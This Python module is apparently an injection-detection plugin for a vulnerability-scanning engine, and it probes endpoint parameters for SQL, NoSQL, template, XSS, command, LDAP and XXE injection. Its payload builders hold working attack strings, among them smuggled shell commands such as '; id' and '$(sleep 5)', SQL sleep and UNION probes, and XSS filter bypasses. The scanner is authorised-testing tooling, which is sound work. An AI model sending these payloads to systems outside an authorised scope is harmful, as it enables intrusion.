#!/usr/bin/env python3
"""Injection depth kit for the Hunter Engine.

Covers the seven server-side injection families the surface may expose:
SQLi, NoSQLi, SSTI, XSS, command injection, XXE and LDAP. For every parameter
it finds on ``ctx.endpoints`` it tests each class *many* ways (several
techniques + bypasses) and classifies by diffing each probe against a clean
baseline response rather than trusting a status code.

Reuse, not re-implementation. The kit drives the existing tools named for it:

* ``tools.nosqli_scanner`` - operator payloads (``query_string_payloads``,
  ``_AUTH_OPERATORS``) and the differential/timing classifiers
  (``classify_differential``, ``classify_timing``).
* ``tools.xxe_scanner``    - ``build_payloads`` + ``classify`` (the safe
  internal-entity -> error-based-read ladder).
* ``tools.waf_encoder``    - encoded payload variants for soft-blocked XSS.
* ``tools.dom_xss_harness``- the unique ``canary`` marker and the DOM-sink
  vector list for context-aware reflection.

Safety. These are non-destructive detection probes only: no stacked ``DROP``,
no command injection that writes or deletes, no ``DELETE``/``TRACE`` methods.
Time-based techniques use a single small sleep and are reported as *blind* -
flagged ``needs_oob`` so the gate never treats them as report-ready without
out-of-band (or replay) confirmation. Every request goes through ``ctx.fetch``
(SSRF-safe, mockable); nothing here touches the network directly. No secret
(auth header/token) is ever copied into a Finding.
"""
from __future__ import annotations

import os
import re
import sys
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

# Make ``from tools import ...`` work no matter how the kit is imported (engine
# scan, test, or standalone), mirroring the bootstrap the other tools use.
_REPO = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", ".."))
if _REPO not in sys.path:
    sys.path.insert(0, _REPO)

from tools.hunter.contract import (  # noqa: E402
    Finding,
    HuntContext,
    V_CONFIRMED,
    V_INCONCLUSIVE,
    V_POSSIBLE,
    register,
)

# --- reused tools (import-robust: a missing tool degrades, never breaks) -----
try:
    from tools import nosqli_scanner as _nosqli  # noqa: E402
except Exception:  # pragma: no cover - the tool ships in this repo
    _nosqli = None
try:
    from tools import xxe_scanner as _xxe  # noqa: E402
except Exception:  # pragma: no cover
    _xxe = None
try:
    from tools import waf_encoder as _waf  # noqa: E402
except Exception:  # pragma: no cover
    _waf = None
try:
    from tools import dom_xss_harness as _domxss  # noqa: E402
except Exception:  # pragma: no cover
    _domxss = None


# --- tunables ---------------------------------------------------------------
SLEEP_S = 5                     # seconds a time-based payload asks the server to sleep
SLEEP_MS = SLEEP_S * 1000
MAX_PARAMS = 20                 # cap params probed per endpoint (noise control)
MAX_UNION_COLS = 8              # ORDER BY ladder depth for UNION shape
_BENIGN = "1"                   # neutral seed value for a parameter
_BODY_METHODS = ("POST", "PUT", "PATCH")
_SKIP_METHODS = ("DELETE", "TRACE", "OPTIONS", "HEAD", "CONNECT")


# --- known error / output signatures ----------------------------------------
_SQL_ERRORS = re.compile(
    r"SQL syntax.*?MySQL|Warning.*?\bmysqli?\b|MySqlException|valid MySQL result|"
    r"check the manual that corresponds to your (?:MySQL|MariaDB) server|"
    r"PostgreSQL.*?ERROR|pg_query\(\)|pg_exec\(\)|PSQLException|"
    r"unterminated quoted string|"
    r"Unclosed quotation mark after the character string|"
    r"Microsoft SQL (?:Native Client|Server)|OLE DB.*?SQL Server|"
    r"System\.Data\.SqlClient\.SqlException|Incorrect syntax near|"
    r"ORA-\d{5}|Oracle.*?error|quoted string not properly terminated|"
    r"SQLite(?:/JDBCDriver|\.Exception)|System\.Data\.SQLite\.SQLiteException|"
    r"sqlite3\.OperationalError|near \"[^\"]*\": syntax error|SQLSTATE\[",
    re.IGNORECASE | re.DOTALL,
)
# `id` output, e.g. uid=0(root) gid=0(root) groups=0(root)
_CMD_ID = re.compile(r"uid=\d+\([^)]*\)\s+gid=\d+\([^)]*\)", re.IGNORECASE)
_LDAP_ERR = re.compile(
    r"javax\.naming\.|LDAPException|com\.sun\.jndi\.ldap|Invalid DN syntax|"
    r"invalid filter|ldap_search|supplied argument is not a valid ldap|"
    r"AcceptSecurityContext error|DSID-[0-9A-Fa-f]+|Protocol error occurred",
    re.IGNORECASE,
)

# NoSQLi operator payloads (reused from the scanner, with a safe fallback).
_NOSQL_OPS = getattr(_nosqli, "_AUTH_OPERATORS", None) or [
    {"$ne": None}, {"$ne": ""}, {"$gt": ""}, {"$gte": ""},
    {"$regex": ".*"}, {"$exists": True},
]

# SSTI polyglot family -> engine the syntax points at. ``7*7`` -> ``49``.
_SSTI_SYNTAX = [
    ("{{7*7}}", "Jinja2 / Twig / Nunjucks  ({{ }})"),
    ("${{7*7}}", "polyglot  (${{ }})"),
    ("{{=7*7}}", "doT / underscore  ({{= }})"),
    ("<%= 7*7 %>", "ERB / EJS  (<%= %>)"),
    ("${7*7}", "FreeMarker / Thymeleaf / JSP-EL / Mako  (${ })"),
    ("#{7*7}", "Ruby / Slim / Thymeleaf  (#{ })"),
    ("@(7*7)", "Razor  (@( ))"),
    ("*{7*7}", "Thymeleaf selection  (*{ })"),
    ("{7*7}", "bare brace  ({ })"),
]


# ============================================================================
# parameter discovery
# ============================================================================
def _merge_spec(spec, loc, add):
    """Feed a parameter spec (dict / list / csv string / JSON string) to ``add``."""
    if spec is None:
        return
    if isinstance(spec, str):
        s = spec.strip()
        if s[:1] in "{[":
            try:
                import json
                spec = json.loads(s)
            except Exception:
                spec = None
        if isinstance(spec, str):
            for nm in spec.split(","):
                add(nm.strip(), loc, None)
            return
    if isinstance(spec, dict):
        for k, v in spec.items():
            add(k, loc, v if not isinstance(v, (dict, list)) else None)
    elif isinstance(spec, (list, tuple)):
        for item in spec:
            if isinstance(item, dict):
                nm = item.get("name") or item.get("param") or item.get("key")
                add(nm, item.get("in", loc), item.get("value"))
            elif isinstance(item, str):
                add(item, loc, None)


def _iter_params(ep):
    """Return de-duplicated ``[(name, location, seed)]`` for an endpoint.

    ``location`` is ``"query"`` or ``"body"``. Sources, in order: the URL query
    string, explicit ``query``/``query_params``, body specs
    (``body``/``json``/``data``/``form``/``body_params``) and a generic
    ``params`` (located by method).
    """
    if not isinstance(ep, dict):
        return []
    method = str(ep.get("method", "GET")).upper()
    url = ep.get("url", "") or ""
    seen: set = set()
    out: list = []

    def add(name, loc, seed):
        if not name:
            return
        key = (name, loc)
        if key in seen:
            return
        seen.add(key)
        out.append((name, loc, str(seed) if seed is not None else _BENIGN))

    try:
        for name, vals in parse_qs(urlparse(url).query, keep_blank_values=True).items():
            add(name, "query", vals[0] if vals else _BENIGN)
    except Exception:
        pass

    _merge_spec(ep.get("query_params") or ep.get("query"), "query", add)
    for key in ("body_params", "body", "json", "data", "form"):
        if key in ep:
            _merge_spec(ep[key], "body", add)
    if "params" in ep:
        loc = "body" if method in _BODY_METHODS else "query"
        _merge_spec(ep["params"], loc, add)

    return out[:MAX_PARAMS]


# ============================================================================
# request construction / dispatch
# ============================================================================
def _auth_headers(ctx):
    try:
        return dict(getattr(ctx, "account_a").headers or {})
    except Exception:
        return {}


def _req(ctx, method, url, body=None, extra_headers=None):
    """Dispatch one request through ``ctx.fetch`` (auth-aware, never raising)."""
    fetch = getattr(ctx, "fetch", None)
    if fetch is None:
        return None
    headers = _auth_headers(ctx)
    if extra_headers:
        headers.update(extra_headers)
    try:
        return fetch(method, url, headers=headers or None, body=body)
    except TypeError:
        try:
            return fetch(method, url, headers or None, body)
        except Exception:
            return None
    except Exception:
        return None


def _build(ep, params, inject_name, inject_loc, inject_value):
    """Build ``(method, url, body)`` with one parameter set to the payload and
    every other parameter at its benign seed."""
    method = str(ep.get("method", "GET")).upper()
    parsed = urlparse(ep.get("url", ""))
    query = {}
    body = {}
    for name, loc, seed in params:
        target = name == inject_name and loc == inject_loc
        val = inject_value if target else seed
        (query if loc == "query" else body)[name] = [val] if loc == "query" else val
    if inject_loc == "query":
        query[inject_name] = [inject_value]
    else:
        body[inject_name] = inject_value
    new_url = urlunparse(parsed._replace(query=urlencode(query, doseq=True)))
    if body and method == "GET":
        method = "POST"            # a body injection needs a body-bearing method
    return method, new_url, (body or None)


def _send(ctx, ep, params, name, loc, value):
    method, url, body = _build(ep, params, name, loc, value)
    return _req(ctx, method, url, body=body)


# ============================================================================
# response helpers
# ============================================================================
def _is_noise(ctx, r):
    """True for a dead host or an SPA catch-all shell (not a real endpoint)."""
    if r is None:
        return True
    baseline = getattr(ctx, "baseline", None)
    if baseline is not None:
        try:
            if baseline.is_catchall(r.status, r.body):
                return True
        except Exception:
            pass
    return False


def _blen(r):
    return len(r.body or "") if r is not None else 0


def _similar(a, b, tol_abs=48, tol_frac=0.08):
    """Two responses look the same (status + body length within tolerance)."""
    if a is None or b is None:
        return False
    if a.status != b.status:
        return False
    la, lb = _blen(a), _blen(b)
    return abs(la - lb) <= max(tol_abs, int(lb * tol_frac))


def _differs_strongly(a, b, tol_abs=64, tol_frac=0.30):
    """A clearly material difference (status flip or a big length change)."""
    if a is None or b is None:
        return False
    if a.status != b.status:
        return True
    la, lb = _blen(a), _blen(b)
    return abs(la - lb) > max(tol_abs, int(lb * tol_frac))


def _snip(body, needle="", width=90):
    """A short, whitespace-collapsed evidence snippet (never a full body)."""
    if not body:
        return ""
    i = body.find(needle) if needle else -1
    chunk = body[:width] if i < 0 else body[max(0, i - width // 3):][: width]
    return " ".join(chunk.split())[:width]


def _elapsed(r):
    try:
        return float(getattr(r, "elapsed_ms", 0.0) or 0.0)
    except Exception:
        return 0.0


def _timing_hit(base_ms, test_ms):
    if _nosqli is not None:
        try:
            return _nosqli.classify_timing(base_ms, test_ms, SLEEP_MS)
        except Exception:
            pass
    return (test_ms - base_ms) >= SLEEP_MS * 0.7


def _differential_hit(base, test):
    if _nosqli is not None:
        try:
            return _nosqli.classify_differential(
                base.status, _blen(base), test.status, _blen(test)
            )
        except Exception:
            pass
    return _differs_strongly(base, test)


# ============================================================================
# Finding builders
# ============================================================================
def _finding(cls, title, ep, name, loc, technique, *, payload="",
             severity="medium", confidence="firm", verdict=V_POSSIBLE,
             evidence=None, repro=None, chain_hints=None):
    ev = {"param": name, "location": loc}
    if payload:
        ev["payload"] = payload
    if evidence:
        ev.update(evidence)
    return Finding(
        cls=cls, title=title, severity=severity, confidence=confidence,
        axis=f"{loc}:{name}", technique=technique,
        method=str(ep.get("method", "GET")).upper(), url=ep.get("url", ""),
        evidence=ev, verdict=verdict,
        repro=repro or [], kill_reasons=[], chain_hints=chain_hints or [],
    )


def _mark_blind(f, how="out-of-band (OOB) interaction"):
    """Flag a blind finding so the validation gate holds it for confirmation."""
    f.evidence["needs_oob"] = True
    f.evidence.setdefault("confirmation", how)
    f.kill_reasons.append(f"blind: unconfirmed without {how}")
    if f.confidence == "confirmed":
        f.confidence = "firm"
    return f


# ============================================================================
# per-class payload builders (pure)
# ============================================================================
def _sqli_error_values(seed):
    return [
        ("single-quote", seed + "'"),
        ("double-quote", seed + '"'),
        ("quote-paren", seed + "')"),
        ("close-paren", seed + ")"),
        ("backslash", seed + "\\"),
        ("comment-tail", seed + "'-- -"),
    ]


def _sqli_bool_pairs(seed):
    return [
        ("boolean-string", seed + "' AND '1'='1", seed + "' AND '1'='2"),
        ("boolean-numeric", seed + " AND 1=1", seed + " AND 1=2"),
    ]


def _sqli_time_values(seed):
    s = SLEEP_S
    return [
        ("mysql-sleep-string", seed + f"' AND SLEEP({s})-- -"),
        ("mysql-sleep-numeric", seed + f" AND SLEEP({s})"),
        ("postgres-pg_sleep", seed + f"' AND 1=(SELECT 1 FROM PG_SLEEP({s}))-- -"),
        ("mssql-waitfor", seed + f"'; WAITFOR DELAY '0:0:{s}'-- -"),
    ]


def _ssti_values(marker):
    return [(syntax, label, f"{marker}{syntax}{marker}",
             f"{marker}49{marker}") for syntax, label in _SSTI_SYNTAX]


def _xss_payloads(marker):
    """Context-tagged reflected-XSS payloads, each with the ``core`` substring
    that must survive un-escaped for the context to be exploitable."""
    return [
        ("html", f'{marker}"><svg/onload=alert({marker})>',
         f"<svg/onload=alert({marker})>"),
        ("attribute", f'{marker}" autofocus onfocus=alert({marker}) x="',
         f'" autofocus onfocus=alert({marker})'),
        ("js-string", f"{marker}';alert({marker});//",
         f"';alert({marker})"),
    ]


def _cmdi_echo_values(seed):
    return [
        ("semicolon-id", seed + "; id"),
        ("pipe-id", seed + "| id"),
        ("and-id", seed + "&& id"),
        ("subshell-id", seed + "$(id)"),
        ("backtick-id", seed + "`id`"),
        ("newline-id", seed + "%0aid"),
    ]


def _cmdi_time_values(seed):
    s = SLEEP_S
    return [
        ("semicolon-sleep", seed + f"; sleep {s}"),
        ("pipe-sleep", seed + f"| sleep {s}"),
        ("subshell-sleep", seed + f"$(sleep {s})"),
        ("backtick-sleep", seed + f"`sleep {s}`"),
        ("win-ping", seed + f"& ping -n {s + 1} 127.0.0.1"),
    ]


def _ldap_values(seed):
    return [
        ("wildcard", "*"),
        ("filter-break-uid", "*)(uid=*"),
        ("filter-break-objectclass", "*)(objectClass=*"),
        ("or-injection", f"{seed})(|(uid=*"),
        ("close-paren", f"{seed})"),
    ]


# ============================================================================
# per-class probes
# ============================================================================
def _probe_sqli(ctx, ep, params, name, loc, seed, base):
    out = []
    # 1. error-based
    for tech, val in _sqli_error_values(seed):
        r = _send(ctx, ep, params, name, loc, val)
        if _is_noise(ctx, r):
            continue
        if _SQL_ERRORS.search(r.body or "") and not _SQL_ERRORS.search(base.body or ""):
            out.append(_finding(
                "sqli", "SQL error provoked by a syntax-breaking payload",
                ep, name, loc, f"error-based:{tech}", payload=val,
                severity="high", confidence="confirmed", verdict=V_CONFIRMED,
                evidence={"db_error": _snip(r.body, "", 120), "status": r.status},
                repro=[f"Set {loc} parameter '{name}' to: {val}",
                       "A database engine error is returned in the response body."],
                chain_hints=["sqli->data exfiltration (UNION / blind extraction)"],
            ))
            break   # one error-based proof per parameter is enough
    # 2. boolean-based differential
    for tech, tval, fval in _sqli_bool_pairs(seed):
        rt = _send(ctx, ep, params, name, loc, tval)
        rf = _send(ctx, ep, params, name, loc, fval)
        if _is_noise(ctx, rt) or _is_noise(ctx, rf):
            continue
        if _similar(rt, base) and _differs_strongly(rf, base) and _differs_strongly(rt, rf):
            out.append(_finding(
                "sqli", "Boolean-based blind SQLi (truthy vs falsy differ)",
                ep, name, loc, f"boolean-blind:{tech}", payload=f"{tval} | {fval}",
                severity="high", confidence="firm", verdict=V_POSSIBLE,
                evidence={"true_status": rt.status, "true_len": _blen(rt),
                          "false_status": rf.status, "false_len": _blen(rf),
                          "base_len": _blen(base)},
                repro=[f"TRUE  payload on '{name}': {tval}  -> matches baseline",
                       f"FALSE payload on '{name}': {fval}  -> differs from baseline"],
                chain_hints=["boolean blind -> bit-by-bit data extraction"],
            ))
            break
    # 3. time-based blind (reported blind -> needs OOB/replay)
    for tech, val in _sqli_time_values(seed):
        r = _send(ctx, ep, params, name, loc, val)
        if r is None:
            continue
        if _timing_hit(_elapsed(base), _elapsed(r)):
            f = _finding(
                "sqli", "Time-based blind SQLi (injected sleep delayed the response)",
                ep, name, loc, f"time-blind:{tech}", payload=val,
                severity="high", confidence="firm", verdict=V_POSSIBLE,
                evidence={"baseline_ms": round(_elapsed(base)),
                          "injected_ms": round(_elapsed(r)),
                          "delta_ms": round(_elapsed(r) - _elapsed(base)),
                          "sleep_s": SLEEP_S},
                repro=[f"Set '{name}' to: {val}",
                       f"Response is delayed by ~{SLEEP_S}s; benign baseline is fast."],
                chain_hints=["time blind -> full blind extraction / OOB escalation"],
            )
            out.append(_mark_blind(f, "a repeat/OOB timing confirmation"))
            break
    # 4. UNION column-count shape (ORDER BY ladder)
    shape = _union_shape(ctx, ep, params, name, loc, seed, base)
    if shape is not None:
        cols, broke_at = shape
        out.append(_finding(
            "sqli", "UNION-based SQLi column count inferred (ORDER BY shape)",
            ep, name, loc, "union-shape:order-by",
            payload=seed + f"' ORDER BY {cols}-- -",
            severity="medium", confidence="firm", verdict=V_POSSIBLE,
            evidence={"columns": cols, "broke_at": broke_at},
            repro=[f"ORDER BY {cols} on '{name}' is accepted; ORDER BY {broke_at} breaks",
                   f"=> the query exposes {cols} column(s) for a UNION SELECT."],
            chain_hints=[f"UNION SELECT with {cols} column(s) to read arbitrary data"],
        ))
    return out


def _union_shape(ctx, ep, params, name, loc, seed, base):
    """Walk ``ORDER BY 1..N``; return ``(cols, broke_at)`` at an ok->break edge."""
    last_ok = None
    for n in range(1, MAX_UNION_COLS + 1):
        r = _send(ctx, ep, params, name, loc, seed + f"' ORDER BY {n}-- -")
        if _is_noise(ctx, r):
            return None
        broke = bool(_SQL_ERRORS.search(r.body or "")) or _differs_strongly(r, base)
        if broke:
            if last_ok is not None and last_ok >= 1:
                return (last_ok, n)
            return None
        last_ok = n
    return None


def _probe_nosqli(ctx, ep, params, name, loc, seed, base):
    out = []
    # a) query-string bracket operator injection (Express/qs parsers)
    if loc == "query" and _nosqli is not None:
        for raw_frag, url in _nosqli_query_urls(ep, params, name):
            r = _req(ctx, str(ep.get("method", "GET")).upper(), url)
            if _is_noise(ctx, r):
                continue
            if _differential_hit(base, r):
                out.append(_finding(
                    "nosqli", "NoSQL operator injection via query-string brackets",
                    ep, name, loc, "operator-bracket", payload=raw_frag,
                    severity="high", confidence="firm", verdict=V_POSSIBLE,
                    evidence={"base_status": base.status, "base_len": _blen(base),
                              "test_status": r.status, "test_len": _blen(r)},
                    repro=[f"Send query fragment: {raw_frag}",
                           "Response diverges from the benign baseline (filter bypassed)."],
                    chain_hints=["operator injection -> auth bypass / full collection read"],
                ))
                break
    # b) JSON body operator injection
    if loc == "body":
        for op in _NOSQL_OPS:
            r = _send(ctx, ep, params, name, loc, dict(op))
            if _is_noise(ctx, r):
                continue
            if _differential_hit(base, r):
                out.append(_finding(
                    "nosqli", "NoSQL operator injection via JSON body",
                    ep, name, loc, "operator-json",
                    payload=f'{{"{name}": {op}}}',
                    severity="high", confidence="firm", verdict=V_POSSIBLE,
                    evidence={"base_status": base.status, "base_len": _blen(base),
                              "test_status": r.status, "test_len": _blen(r)},
                    repro=[f"Set body field '{name}' to the operator object {op}",
                           "Response diverges from the benign baseline."],
                    chain_hints=["operator injection -> auth bypass / full collection read"],
                ))
                break
        # c) $where server-side-JS time blind
        r = _send(ctx, ep, params, name, loc, {"$where": f"sleep({SLEEP_MS})"})
        if r is not None and _timing_hit(_elapsed(base), _elapsed(r)):
            f = _finding(
                "nosqli", "NoSQL $where time-based blind (server-side JS eval)",
                ep, name, loc, "where-sleep-blind",
                payload=f'{{"{name}": {{"$where": "sleep({SLEEP_MS})"}}}}',
                severity="high", confidence="firm", verdict=V_POSSIBLE,
                evidence={"baseline_ms": round(_elapsed(base)),
                          "injected_ms": round(_elapsed(r)),
                          "delta_ms": round(_elapsed(r) - _elapsed(base))},
                repro=[f"Set body field '{name}' to a $where sleep operator",
                       f"Response is delayed by ~{SLEEP_S}s."],
                chain_hints=["$where eval -> server-side JS execution"],
            )
            out.append(_mark_blind(f, "a repeat/OOB timing confirmation"))
    return out


def _nosqli_query_urls(ep, params, name):
    """URLs carrying bracket-syntax operator payloads from the NoSQL scanner."""
    parsed = urlparse(ep.get("url", ""))
    base_pairs = []
    for pname, loc, seed in params:
        if loc == "query" and pname != name:
            base_pairs.append((pname, seed))
    urls = []
    for frag in _nosqli.query_string_payloads(name):
        key, _, val = frag.partition("=")
        new_q = urlencode(base_pairs + [(key, val)])
        urls.append((frag, urlunparse(parsed._replace(query=new_q))))
    return urls


def _probe_ssti(ctx, ep, params, name, loc, seed, base):
    out = []
    for syntax, label, payload, expected in _ssti_values(_marker()):
        r = _send(ctx, ep, params, name, loc, payload)
        if _is_noise(ctx, r):
            continue
        if expected in (r.body or "") and expected not in (base.body or ""):
            out.append(_finding(
                "ssti", "Server-side template injection (arithmetic evaluated)",
                ep, name, loc, f"polyglot:{syntax}", payload=payload,
                severity="high", confidence="confirmed", verdict=V_CONFIRMED,
                evidence={"engine": label, "reflected": _snip(r.body, "49", 60),
                          "expected": "7*7 -> 49"},
                repro=[f"Set '{name}' to: {payload}",
                       f"Response contains the evaluated marker (49) -> {label}."],
                chain_hints=["SSTI -> remote code execution (engine-specific gadget)"],
            ))
            break   # one confirmed engine is enough; fingerprint recorded
    return out


def _probe_xss(ctx, ep, params, name, loc, seed, base):
    marker = _marker()
    contexts_hit = []
    sample_payload = ""
    reflected_escaped = False
    for vector, payload, core in _xss_payloads(marker):
        r = _send(ctx, ep, params, name, loc, payload)
        if _is_noise(ctx, r):
            continue
        body = r.body or ""
        if core in body and core not in (base.body or ""):
            contexts_hit.append(vector)
            sample_payload = sample_payload or payload
        elif marker in body:
            reflected_escaped = True   # reflected but neutralised (escaped/stripped)
    # URL context (javascript: in an href/src sink) - checked separately.
    url_payload = f"javascript:alert({marker})//{marker}"
    ru = _send(ctx, ep, params, name, loc, url_payload)
    if not _is_noise(ctx, ru) and re.search(
        r"(?:href|src)\s*=\s*[\"']?javascript:alert\(" + re.escape(marker) + r"\)",
        ru.body or "", re.IGNORECASE,
    ):
        contexts_hit.append("url")
        sample_payload = sample_payload or url_payload

    out = []
    if contexts_hit:
        f = _finding(
            "xss", "Reflected XSS: payload echoed un-escaped",
            ep, name, loc, "reflected:" + "+".join(contexts_hit),
            payload=sample_payload, severity="medium", confidence="firm",
            verdict=V_POSSIBLE,
            evidence={"contexts": contexts_hit, "marker": marker,
                      "snippet": _snip((_send(ctx, ep, params, name, loc, sample_payload) or base).body, marker, 90)},
            repro=[f"Set {loc} parameter '{name}' to: {sample_payload}",
                   "The payload is reflected without HTML-encoding of its metacharacters."],
            chain_hints=["reflected XSS -> session/action hijack",
                         "confirm execution in a browser (tools/dom_xss_harness.py)"],
        )
        # execution not proven without a browser -> hold for DOM confirmation
        f.kill_reasons.append("reflection seen; confirm JS execution in a real browser")
        out.append(f)
    elif reflected_escaped:
        # Reflected but escaped on the plain payload: retry WAF-encoded variants.
        out.extend(_xss_waf_bypass(ctx, ep, params, name, loc, marker, base))
    return out


def _xss_waf_bypass(ctx, ep, params, name, loc, marker, base):
    """Try encoded variants (via waf_encoder) when the plain payload is filtered."""
    if _waf is None:
        return []
    seed_payload = f'<svg/onload=alert({marker})>'
    variants = []
    for fn in ("html_entity", "unicode_escape", "base64_wrap_xss"):
        f = getattr(_waf, fn, None)
        if f is None:
            continue
        try:
            variants.extend(f(seed_payload))
        except Exception:
            pass
    for tech, enc in variants[:8]:
        r = _send(ctx, ep, params, name, loc, enc)
        if _is_noise(ctx, r):
            continue
        body = r.body or ""
        if marker in body and re.search(r"<\s*(?:svg|script|img)\b", body, re.IGNORECASE):
            f = _finding(
                "xss", "Reflected XSS via WAF-encoded payload (filter bypass)",
                ep, name, loc, f"reflected-encoded:{tech}", payload=enc,
                severity="medium", confidence="firm", verdict=V_POSSIBLE,
                evidence={"encoding": tech, "marker": marker,
                          "snippet": _snip(body, marker, 90)},
                repro=[f"Plain payload is filtered; the {tech} variant on '{name}' reflects raw.",
                       "Confirm execution in a browser."],
                chain_hints=["WAF-encoded XSS -> session/action hijack"],
            )
            f.kill_reasons.append("reflection seen; confirm JS execution in a real browser")
            return [f]
    return []


def _probe_cmdi(ctx, ep, params, name, loc, seed, base):
    out = []
    # 1. output-based (`id`)
    for tech, val in _cmdi_echo_values(seed):
        r = _send(ctx, ep, params, name, loc, val)
        if _is_noise(ctx, r):
            continue
        if _CMD_ID.search(r.body or "") and not _CMD_ID.search(base.body or ""):
            out.append(_finding(
                "cmdi", "OS command injection ('id' output returned)",
                ep, name, loc, f"output-based:{tech}", payload=val,
                severity="critical", confidence="confirmed", verdict=V_CONFIRMED,
                evidence={"command_output": _snip(r.body, "uid=", 80)},
                repro=[f"Set '{name}' to: {val}",
                       "The response contains the output of the `id` command."],
                chain_hints=["cmdi -> full host compromise"],
            ))
            break
    # 2. time-based blind (`sleep`) - reported blind
    for tech, val in _cmdi_time_values(seed):
        r = _send(ctx, ep, params, name, loc, val)
        if r is None:
            continue
        if _timing_hit(_elapsed(base), _elapsed(r)):
            f = _finding(
                "cmdi", "Blind OS command injection (injected sleep delayed the response)",
                ep, name, loc, f"time-blind:{tech}", payload=val,
                severity="critical", confidence="firm", verdict=V_POSSIBLE,
                evidence={"baseline_ms": round(_elapsed(base)),
                          "injected_ms": round(_elapsed(r)),
                          "delta_ms": round(_elapsed(r) - _elapsed(base)),
                          "sleep_s": SLEEP_S},
                repro=[f"Set '{name}' to: {val}",
                       f"Response is delayed by ~{SLEEP_S}s; benign baseline is fast."],
                chain_hints=["blind cmdi -> OOB exfiltration / host compromise"],
            )
            out.append(_mark_blind(f, "an OOB (DNS/HTTP) callback"))
            break
    return out


def _probe_ldap(ctx, ep, params, name, loc, seed, base):
    out = []
    for tech, val in _ldap_values(seed):
        r = _send(ctx, ep, params, name, loc, val)
        if _is_noise(ctx, r):
            continue
        if _LDAP_ERR.search(r.body or "") and not _LDAP_ERR.search(base.body or ""):
            out.append(_finding(
                "ldap", "LDAP injection (filter error provoked)",
                ep, name, loc, f"error-based:{tech}", payload=val,
                severity="high", confidence="confirmed", verdict=V_CONFIRMED,
                evidence={"ldap_error": _snip(r.body, "", 100)},
                repro=[f"Set '{name}' to: {val}",
                       "An LDAP filter/parse error is returned."],
                chain_hints=["LDAP injection -> auth bypass / directory disclosure"],
            ))
            return out
        if tech in ("wildcard", "filter-break-uid", "filter-break-objectclass") \
                and _differential_hit(base, r):
            out.append(_finding(
                "ldap", "Possible LDAP filter injection (wildcard widened the result set)",
                ep, name, loc, f"differential:{tech}", payload=val,
                severity="medium", confidence="firm", verdict=V_POSSIBLE,
                evidence={"base_status": base.status, "base_len": _blen(base),
                          "test_status": r.status, "test_len": _blen(r)},
                repro=[f"Set '{name}' to: {val}",
                       "The response set diverges markedly from the benign baseline."],
                chain_hints=["LDAP wildcard -> authentication bypass / enumeration"],
            ))
            return out
    return out


def _probe_xxe(ctx, ep):
    """Endpoint-level XXE: send the scanner's safe payload ladder, classify."""
    if _xxe is None:
        return []
    method = str(ep.get("method", "GET")).upper()
    if method not in _BODY_METHODS:
        return []
    canary = "XXE" + os.urandom(4).hex().upper()
    try:
        payloads = _xxe.build_payloads(canary, None)   # None => no OOB payload
    except Exception:
        return []
    results = {}
    for kind, xml in payloads.items():
        r = _req(ctx, method, ep.get("url", ""), body=xml,
                 extra_headers={"Content-Type": "application/xml"})
        if _is_noise(ctx, r):
            continue
        if r is not None:
            results[kind] = (r.status, r.body or "")
    if not results:
        return []
    try:
        v = _xxe.classify(canary, results, None)
    except Exception:
        v = None
    if v is None:
        return []
    sev = {"HIGH": "high", "MEDIUM": "medium", "LOW": "info"}.get(v.severity, "low")
    confirmed = v.payload_kind == "error_based" and v.severity == "HIGH"
    f = _finding(
        "xxe", "XXE: " + v.reason, ep, "<xml-body>", "body",
        f"xxe:{v.payload_kind}", payload=f"XML DOCTYPE entity ({v.payload_kind})",
        severity=sev,
        confidence="confirmed" if confirmed else "firm",
        verdict=V_CONFIRMED if confirmed else (V_POSSIBLE if v.severity != "LOW" else V_INCONCLUSIVE),
        evidence={"xxe_reason": v.reason, "payload_kind": v.payload_kind},
        repro=["POST the XML entity payload to this endpoint.",
               v.reason],
        chain_hints=["XXE -> file read / SSRF (escalate via parameter entities + OOB)"],
    )
    if not confirmed:
        # internal-entity expansion / parse-only need OOB (or a gadget) to weaponise.
        _mark_blind(f, "an OOB parameter-entity channel")
    return [f]


# ============================================================================
# the kit
# ============================================================================
_PARAM_PROBES = (_probe_sqli, _probe_nosqli, _probe_ssti, _probe_xss,
                 _probe_cmdi, _probe_ldap)


def _marker():
    """A unique greppable canary (reuses dom_xss_harness.canary when present)."""
    if _domxss is not None:
        try:
            return _domxss.canary()
        except Exception:
            pass
    return "cbbx" + os.urandom(6).hex()


class InjectionKit:
    """Depth kit for the server-side injection families."""

    name = "injection"
    classes = ("sqli", "nosqli", "ssti", "xss", "cmdi", "xxe", "ldap")

    def applicable(self, ctx: HuntContext) -> bool:
        """Warranted whenever any in-scope endpoint carries query/body params."""
        for ep in getattr(ctx, "endpoints", None) or []:
            if not isinstance(ep, dict):
                continue
            if str(ep.get("method", "GET")).upper() in _SKIP_METHODS:
                continue
            if _iter_params(ep):
                return True
        return False

    def run(self, ctx: HuntContext) -> list:
        findings: list = []
        if getattr(ctx, "fetch", None) is None:
            return findings
        for ep in getattr(ctx, "endpoints", None) or []:
            if not isinstance(ep, dict) or not ep.get("url"):
                continue
            method = str(ep.get("method", "GET")).upper()
            if method in _SKIP_METHODS:
                continue
            host = urlparse(ep["url"]).hostname or ""
            try:
                if not ctx.in_scope(host):
                    continue
            except Exception:
                pass

            # endpoint-level probe: XXE (body-bearing endpoints only). Injection
            # detection sends only NON-destructive payloads (no DROP, no
            # destructive commands, DELETE/TRACE skipped), so — like every
            # standard scanner — it may POST to login/search/JSON endpoints
            # without allow_write. allow_write gates data MUTATION (the access,
            # logic and auth kits), not injection probing.
            try:
                findings.extend(_probe_xxe(ctx, ep))
            except Exception:
                pass

            # per-parameter probes.
            params = _iter_params(ep)
            for name, loc, seed in params:
                base = _send(ctx, ep, params, name, loc, seed)
                if _is_noise(ctx, base):
                    continue
                for probe in _PARAM_PROBES:
                    try:
                        findings.extend(probe(ctx, ep, params, name, loc, seed, base))
                    except Exception:
                        continue
        return findings


register(InjectionKit())
